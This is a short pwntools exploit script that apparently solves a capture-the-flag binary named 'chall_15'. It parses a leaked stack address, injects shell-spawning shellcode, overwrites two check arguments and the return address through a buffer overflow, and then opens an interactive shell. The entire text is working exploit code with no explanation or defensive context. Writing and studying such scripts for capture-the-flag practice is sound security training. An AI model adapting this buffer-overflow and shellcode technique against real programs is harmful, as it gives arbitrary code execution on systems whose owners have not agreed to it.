from pwn import *
p=process("./chall_15")
p.recvline()
import re
arg1 = 0xdeadd00d
arg2 = 0xb16b00b5
string = p.recvline()
shelladdr = int(re.findall(b"(0x[0-9a-f]{4,16})",string)[0],16)
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload = shellcode + b"A"*(0x120 - len(shellcode) - 8) + p32(arg1) + p32(arg2) + b"A"*8 + p64(shelladdr)
p.sendline(payload)
p.interactive()
